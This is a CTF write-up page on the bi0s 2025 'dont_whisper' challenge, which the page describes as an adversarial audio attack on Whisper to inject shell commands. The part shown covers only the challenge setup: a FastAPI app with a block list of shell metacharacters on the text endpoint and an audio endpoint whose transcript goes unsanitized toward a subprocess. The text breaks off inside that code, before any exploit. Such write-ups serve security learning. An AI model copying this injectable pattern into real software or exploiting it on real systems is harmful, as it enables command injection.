<!doctype html><html lang=en-US class="scroll-smooth dark"><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><title>Writeup – bi0s CTF 2025: dont_whisper</title>
<meta name=description content="Adversarial audio attack against Whisper tiny.en to inject shell commands."><link rel=canonical href=https://pwn-la-chapelle.eu/posts/bi0s2025_dontwhisper/><link rel=robots href=../../robots.txt><link rel=icon type=image/x-icon href=../../icons/favicon.ico><script defer>MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]]}}</script><script defer type=text/javascript id=MathJax-script src=https://pwn-la-chapelle.eu/mod/mathjax/tex-mml-chtml.7a1c82c2260a2f707b6f1fd7f97d2bb3524a17d00dcf08ce78ebc1ebd6283ce667a41842f46452bb6af2f6f02ebf8678eb4588ed8b788aad1d10f3de0849675c.js async></script><link rel=stylesheet href="https://pwn-la-chapelle.eu/css/app.min.8071ebf17b70feb935f315b283430ce0008c8e8e23e6b9b9dcf7f7fda04811a1.css"><link rel=icon size=any href=../../img/pwn_logo_file_hu14080873618134357347.png><link rel=apple-touch-icon href=../../img/pwn_logo_file_hu14080873618134357347.png></head><body class="max-w-screen-md mx-auto"><div class=header><header class="flex flex-col sm:flex-row items-center gap-5 sm:gap-10 pt-16 py-12"><div class="flex-none rounded-full overflow-hidden"><a href=https://pwn-la-chapelle.eu/><img srcset="../../img/pwn_logo_file_hu12404508553282092111.png 90w" src=../../img/pwn_logo_file.png width=1979 height=1979 alt=Pwn-la-Chapelle style=width:9rem></a></div><div class="flex flex-col gap-5"><div><a href=https://pwn-la-chapelle.eu/><h1 id=site-title>Pwn-la-Chapelle</h1></a><h5 id=site-description>Popping Shells and Stealing Flags at RWTH Aachen University</h5></div><nav><ul><li><a href=../../>Home</a></li><li><a href=../../about>About Us</a></li><li><a href=../../posts>Blog</a></li><li><button class=toggle-theme aria-label="Toggle Theme" title="Toggle Theme" onclick=toggleTheme()>
<span class="theme-icon light"><svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v2.25m6.364.386-1.591 1.591M21 12h-2.25m-.386 6.364-1.591-1.591M12 18.75V21m-4.773-4.227-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75.0 11-7.5.0 3.75 3.75.0 017.5.0z"/></svg> </span><span class="theme-icon dark"><svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor"><path stroke-linecap="round" stroke-linejoin="round" d="M21.752 15.002A9.718 9.718.0 0118 15.75c-5.385.0-9.75-4.365-9.75-9.75.0-1.33.266-2.597.748-3.752A9.753 9.753.0 003 11.25C3 16.635 7.365 21 12.75 21a9.753 9.753.0 009.002-5.998z"/></svg> </span></button>
<script>document.addEventListener("DOMContentLoaded",function(){var e=localStorage.getItem("theme");!e&&window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches&&(e="dark",setTheme("dark")),setTheme(!e||e==="dark"?"dark":e)});function setTheme(e){const t=document.querySelector("html");localStorage.setItem("theme",e),e==="light"?(t.classList.contains("dark")&&document.querySelector("html").classList.remove("dark"),document.querySelector(".theme-icon.light").style.display="none",document.querySelector(".theme-icon.dark").style.display="block"):(t.classList.contains("dark")||document.querySelector("html").classList.add("dark"),document.querySelector(".theme-icon.dark").style.display="none",document.querySelector(".theme-icon.light").style.display="block")}function toggleTheme(){const e=localStorage.getItem("theme");setTheme(e==="light"?"dark":"light")}</script></li></ul></nav></div></header></div><main id=content><article class="flex flex-col gap-10"><header class="flex flex-col gap-2"><h2 class=title-large>Writeup – bi0s CTF 2025: dont_whisper</h2><div class=meta>by
<a href=https://github.com/D-VR target=_blank>Euph0r14</a>
-
<time datetime="2025-06-09 12:00:00 +0000 UTC" title='Mon, Jun 9, 2025, 12:00 PM UTC'>2025-06-09
</time>-
Estimated reading time: 14 minutes</div></header><section><h2 id=1-challenge-overview>1. Challenge Overview</h2><blockquote><p>many say that neural networks are non deterministic and generating mappings between input and output is non TRIVIAL</p></blockquote><ul><li><strong>Name</strong>: dont_whisper</li><li><strong>Category</strong>: Misc</li><li><strong>Points</strong>: 991/1000</li><li><strong>Solves</strong>: 5</li><li><strong>Author</strong>: w1z</li><li><strong>Challenge Files</strong>: <a download=dont_whisper href=dont_whisper.zip>dont_whisper.zip</a></li><li><strong>Flag Format</strong>: <code>bi0sctf{…}</code></li></ul><p>The challenge provides a FastAPI-based service, allowing users to interact with a chatbot via text and audio. Audio uploads are passed through a patched version (it was patched to simplify the exploit, more details later) of OpenAI&rsquo;s Whisper ASR (tiny.en v20231117), before getting passed to the Chatbot. Our goal was to find and exploit vulnerabilities within the provided system to read the flag placed at <code>/chal/flag</code>.</p><h2 id=2-initial-reconnaissance>2. Initial Reconnaissance</h2><p>We began by examining the provided source code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1>1</a></span><span>dont_whisper/
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2>2</a></span><span>├── src/
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-3>3</a></span><span>│   ├── chatapp/
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-4>4</a></span><span>│   │   ├── app.py          # FastAPI service
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-5>5</a></span><span>│   │   └── templates/...   # UI
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-6>6</a></span><span>│   ├── chatbot.py          # simple keyword-based responses
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-7>7</a></span><span>│   └── whisper/            # patched Whisper v20231117 sources
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-8>8</a></span><span>└── Dockerfile, configs
</span></span></code></pre></div><p>In <code>src/chatapp/app.py</code>, two endpoints stand out:</p><ul><li><strong><code>POST /api/chat</code></strong>: sanitizes dangerous characters like (<code>'</code>, <code>;</code>, <code>&</code>), then safely runs:<style type=text/css>.highlight-wrapper{position:relative;transition:max-height .3s ease-out,overflow .3s ease-out;margin-bottom:20px}.highlight-link{position:absolute;bottom:-10px;right:10px;background:#00549f;color:#fff;padding:5px 10px;border-radius:4px;text-decoration:none;font-size:.9em;transition:background .3s ease-out}.highlight-link:hover{background:#0056b3}</style><script type=text/javascript>function toggle(e){e.preventDefault();var t=e.target,n=t.closest(".highlight-wrapper");t.innerHTML.includes("expand")||t.innerHTML.includes("show entire code")?(t.innerHTML="Click here to collapse",n.querySelector(".preview").style.display="none",n.querySelector(".full").style.display="block"):(t.innerHTML=t.dataset.expandText,n.querySelector(".preview").style.display="block",n.querySelector(".full").style.display="none")}document.addEventListener("DOMContentLoaded",function(){var e=document.querySelectorAll(".highlight-link a");e.forEach(function(e){e.addEventListener("click",toggle)})})</script><div class=highlight-wrapper><div class=highlight-before></div><div class=preview><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=1><a style=outline:none;text-decoration:none;color:inherit href=#1> 1</a></span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>sanitize_input</span>(text: <span style=color:#8be9fd;font-style:italic>str</span>) <span style=color:#ff79c6>-&gt;</span> <span style=color:#8be9fd;font-style:italic>str</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=2><a style=outline:none;text-decoration:none;color:inherit href=#2> 2</a></span><span>    <span style=color:#f1fa8c>&#34;&#34;&#34;Sanitize user input to prevent command injection.&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=3><a style=outline:none;text-decoration:none;color:inherit href=#3> 3</a></span><span>    <span style=color:#6272a4># Block common dangerous characters</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=4><a style=outline:none;text-decoration:none;color:inherit href=#4> 4</a></span><span>    dangerous_chars <span style=color:#ff79c6>=</span> [<span style=color:#f1fa8c>&#34;&#39;&#34;</span>, <span style=color:#f1fa8c>&#34;;&#34;</span>, <span style=color:#f1fa8c>&#34;&amp;&#34;</span>, <span style=color:#f1fa8c>&#34;|&#34;</span>, <span style=color:#f1fa8c>&#34;`&#34;</span>, <span style=color:#f1fa8c>&#34;$&#34;</span>, <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>, <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\r</span><span style=color:#f1fa8c>&#34;</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=5><a style=outline:none;text-decoration:none;color:inherit href=#5> 5</a></span><span>    <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>any</span>(char <span style=color:#ff79c6>in</span> text <span style=color:#ff79c6>for</span> char <span style=color:#ff79c6>in</span> dangerous_chars):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=6><a style=outline:none;text-decoration:none;color:inherit href=#6> 6</a></span><span>        <span style=color:#ff79c6>raise</span> HTTPException(status_code<span style=color:#ff79c6>=</span><span style=color:#bd93f9>400</span>, detail<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;Invalid input detected.&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=7><a style=outline:none;text-decoration:none;color:inherit href=#7> 7</a></span><span>    <span style=color:#ff79c6>return</span> text<span style=color:#ff79c6>.</span>strip()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=8><a style=outline:none;text-decoration:none;color:inherit href=#8> 8</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=9><a style=outline:none;text-decoration:none;color:inherit href=#9> 9</a></span><span>@app.post(<span style=color:#f1fa8c>&#34;/api/chat&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=10><a style=outline:none;text-decoration:none;color:inherit href=#10>10</a></span><span><span style=color:#ff79c6>async</span> <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>chat_response</span>(user_text: <span style=color:#8be9fd;font-style:italic>str</span> <span style=color:#ff79c6>=</span> Form(<span style=color:#ff79c6>...</span>)):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=11><a style=outline:none;text-decoration:none;color:inherit href=#11>11</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=12><a style=outline:none;text-decoration:none;color:inherit href=#12>12</a></span><span>    sanitized_text <span style=color:#ff79c6>=</span> sanitize_input(user_text)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=13><a style=outline:none;text-decoration:none;color:inherit href=#13>13</a></span><span>[<span style=color:#ff79c6>...</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=14><a style=outline:none;text-decoration:none;color:inherit href=#14>14</a></span><span>    result <span style=color:#ff79c6>=</span> subprocess<span style=color:#ff79c6>.</span>run(
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=15><a style=outline:none;text-decoration:none;color:inherit href=#15>15</a></span><span>        [<span style=color:#f1fa8c>&#39;python3&#39;</span>, <span style=color:#f1fa8c>&#39;chatbot.py&#39;</span>, sanitized_text],
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=16><a style=outline:none;text-decoration:none;color:inherit href=#16>16</a></span><span>        stdout<span style=color:#ff79c6>=</span>subprocess<span style=color:#ff79c6>.</span>PIPE,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=17><a style=outline:none;text-decoration:none;color:inherit href=#17>17</a></span><span>        stderr<span style=color:#ff79c6>=</span>subprocess<span style=color:#ff79c6>.</span>DEVNULL,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=18><a style=outline:none;text-decoration:none;color:inherit href=#18>18</a></span><span>        text<span style=color:#ff79c6>=</span><span style=color:#ff79c6>True</span>  <span style=color:#6272a4># ensures output is captured as a string instead of bytes</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=19><a style=outline:none;text-decoration:none;color:inherit href=#19>19</a></span><span>    )
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=20><a style=outline:none;text-decoration:none;color:inherit href=#20>20</a></span><span>[<span style=color:#ff79c6>...</span>]</span></span></code></pre></div></div><div class=full style=display:none><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=1><a style=outline:none;text-decoration:none;color:inherit href=#1> 1</a></span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>sanitize_input</span>(text: <span style=color:#8be9fd;font-style:italic>str</span>) <span style=color:#ff79c6>-&gt;</span> <span style=color:#8be9fd;font-style:italic>str</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=2><a style=outline:none;text-decoration:none;color:inherit href=#2> 2</a></span><span>    <span style=color:#f1fa8c>&#34;&#34;&#34;Sanitize user input to prevent command injection.&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=3><a style=outline:none;text-decoration:none;color:inherit href=#3> 3</a></span><span>    <span style=color:#6272a4># Block common dangerous characters</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=4><a style=outline:none;text-decoration:none;color:inherit href=#4> 4</a></span><span>    dangerous_chars <span style=color:#ff79c6>=</span> [<span style=color:#f1fa8c>&#34;&#39;&#34;</span>, <span style=color:#f1fa8c>&#34;;&#34;</span>, <span style=color:#f1fa8c>&#34;&amp;&#34;</span>, <span style=color:#f1fa8c>&#34;|&#34;</span>, <span style=color:#f1fa8c>&#34;`&#34;</span>, <span style=color:#f1fa8c>&#34;$&#34;</span>, <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>, <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\r</span><span style=color:#f1fa8c>&#34;</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=5><a style=outline:none;text-decoration:none;color:inherit href=#5> 5</a></span><span>    <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>any</span>(char <span style=color:#ff79c6>in</span> text <span style=color:#ff79c6>for</span> char <span style=color:#ff79c6>in</span> dangerous_chars):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=6><a style=outline:none;text-decoration:none;color:inherit href=#6> 6</a></span><span>        <span style=color:#ff79c6>raise</span> HTTPException(status_code<span style=color:#ff79c6>=</span><span style=color:#bd93f9>400</span>, detail<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;Invalid input detected.&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=7><a style=outline:none;text-decoration:none;color:inherit href=#7> 7</a></span><span>    <span style=color:#ff79c6>return</span> text<span style=color:#ff79c6>.</span>strip()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=8><a style=outline:none;text-decoration:none;color:inherit href=#8> 8</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=9><a style=outline:none;text-decoration:none;color:inherit href=#9> 9</a></span><span>@app.post(<span style=color:#f1fa8c>&#34;/api/chat&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=10><a style=outline:none;text-decoration:none;color:inherit href=#10>10</a></span><span><span style=color:#ff79c6>async</span> <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>chat_response</span>(user_text: <span style=color:#8be9fd;font-style:italic>str</span> <span style=color:#ff79c6>=</span> Form(<span style=color:#ff79c6>...</span>)):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=11><a style=outline:none;text-decoration:none;color:inherit href=#11>11</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=12><a style=outline:none;text-decoration:none;color:inherit href=#12>12</a></span><span>    sanitized_text <span style=color:#ff79c6>=</span> sanitize_input(user_text)
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=13><a style=outline:none;text-decoration:none;color:inherit href=#13>13</a></span><span>    <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;got here&#34;</span>)
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=14><a style=outline:none;text-decoration:none;color:inherit href=#14>14</a></span><span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=15><a style=outline:none;text-decoration:none;color:inherit href=#15>15</a></span><span>    <span style=color:#6272a4># Run the chatbot command in a subprocess</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=16><a style=outline:none;text-decoration:none;color:inherit href=#16>16</a></span><span>    result <span style=color:#ff79c6>=</span> subprocess<span style=color:#ff79c6>.</span>run(
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=17><a style=outline:none;text-decoration:none;color:inherit href=#17>17</a></span><span>        [<span style=color:#f1fa8c>&#39;python3&#39;</span>, <span style=color:#f1fa8c>&#39;chatbot.py&#39;</span>, sanitized_text],
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=18><a style=outline:none;text-decoration:none;color:inherit href=#18>18</a></span><span>        stdout<span style=color:#ff79c6>=</span>subprocess<span style=color:#ff79c6>.</span>PIPE,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=19><a style=outline:none;text-decoration:none;color:inherit href=#19>19</a></span><span>        stderr<span style=color:#ff79c6>=</span>subprocess<span style=color:#ff79c6>.</span>DEVNULL,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=20><a style=outline:none;text-decoration:none;color:inherit href=#20>20</a></span><span>        text<span style=color:#ff79c6>=</span><span style=color:#ff79c6>True</span>  <span style=color:#6272a4># ensures output is captured as a string instead of bytes</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=21><a style=outline:none;text-decoration:none;color:inherit href=#21>21</a></span><span>    )
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=22><a style=outline:none;text-decoration:none;color:inherit href=#22>22</a></span><span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=23><a style=outline:none;text-decoration:none;color:inherit href=#23>23</a></span><span>    stdout <span style=color:#ff79c6>=</span> result<span style=color:#ff79c6>.</span>stdout
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=24><a style=outline:none;text-decoration:none;color:inherit href=#24>24</a></span><span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=25><a style=outline:none;text-decoration:none;color:inherit href=#25>25</a></span><span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=26><a style=outline:none;text-decoration:none;color:inherit href=#26>26</a></span><span>    <span style=color:#6272a4># Decode output from bytes to string</span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=27><a style=outline:none;text-decoration:none;color:inherit href=#27>27</a></span><span>    <span style=color:#ff79c6>return</span> JSONResponse(content<span style=color:#ff79c6>=</span>{<span style=color:#f1fa8c>&#34;response&#34;</span>: stdout<span style=color:#ff79c6>.</span>strip()})</span></span></code></pre></div></div><div class=highlight-link><a href style=text-decoration:none data-expand-text="Click here to expand">Click here to expand</a></div></div></li><li><strong><code>POST /api/audio-chat</code></strong>: no sanitization of transcripts:
<script type=text/javascript>function toggle(e){e.preventDefault();var t=e.target,n=t.closest(".highlight-wrapper");t.innerHTML.includes("expand")||t.innerHTML.includes("show entire code")?(t.innerHTML="Click here to collapse",n.querySelector(".preview").style.display="none",n.querySelector(".full").style.display="block"):(t.innerHTML=t.dataset.expandText,n.querySelector(".preview").style.display="block",n.querySelector(".full").style.display="none")}document.addEventListener("DOMContentLoaded",function(){var e=document.querySelectorAll(".highlight-link a");e.forEach(function(e){e.addEventListener("click",toggle)})})</script><div class=highlight-wrapper><div class=highlight-before></div><div class=preview><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=1><a style=outline:none;text-decoration:none;color:inherit href=#1> 1</a></span><span>@app.post(<span style=color:#f1fa8c>&#34;/api/audio-chat&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=2><a style=outline:none;text-decoration:none;color:inherit href=#2> 2</a></span><span><span style=color:#ff79c6>async</span> <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>audio_response</span>(audio: UploadFile <span style=color:#ff79c6>=</span> File(<span style=color:#ff79c6>...</span>)):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=3><a style=outline:none;text-decoration:none;color:inherit href=#3> 3</a></span><span>[<span style=color:#ff79c6>...</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=4><a style=outline:none;text-decoration:none;color:inherit href=#4> 4</a></span><span>            result <span style=color:#ff79c6>=</span> subprocess<span style=color:#ff79c6>.</span>run(
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=5><a style=outline:none;text-decoration:none;color:inherit href=#5> 5</a></span><span>                [
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=6><a style=outline:none;text-decoration:none;color:inherit href=#6> 6</a></span><span>                    <span style=color:#f1fa8c>&#34;python3&#34;</span>, <span style=color:#f1fa8c>&#34;whisper.py&#34;</span>, <span style=color:#f1fa8c>&#34;--model&#34;</span>, <span style=color:#f1fa8c>&#34;tiny.en&#34;</span>, audio_file_path,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=7><a style=outline:none;text-decoration:none;color:inherit href=#7> 7</a></span><span>                    <span style=color:#f1fa8c>&#34;--language&#34;</span>, <span style=color:#f1fa8c>&#34;English&#34;</span>, <span style=color:#f1fa8c>&#34;--best_of&#34;</span>, <span style=color:#f1fa8c>&#34;5&#34;</span>, <span style=color:#f1fa8c>&#34;--beam_size&#34;</span>, <span style=color:#f1fa8c>&#34;None&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=8><a style=outline:none;text-decoration:none;color:inherit href=#8> 8</a></span><span>                ],
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=9><a style=outline:none;text-decoration:none;color:inherit href=#9> 9</a></span><span>                stdout<span style=color:#ff79c6>=</span>subprocess<span style=color:#ff79c6>.</span>PIPE,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=10><a style=outline:none;text-decoration:none;color:inherit href=#10>10</a></span><span>                stderr<span style=color:#ff79c6>=</span>subprocess<span style=color:#ff79c6>.</span>PIPE,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=11><a style=outline:none;text-decoration:none;color:inherit href=#11>11</a></span><span>                text<span style=color:#ff79c6>=</span><span style=color:#ff79c6>True</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=12><a style=outline:none;text-decoration:none;color:inherit href=#12>12</a></span><span>            )
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=13><a style=outline:none;text-decoration:none;color:inherit href=#13>13</a></span><span>[<span style=color:#ff79c6>...</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=14><a style=outline:none;text-decoration:none;color:inherit href=#14>14</a></span><span>            transcription <span style=color:#ff79c6>=</span> result<span style=color:#ff79c6>.</span>stdout<span style=color:#ff79c6>.</span>strip()
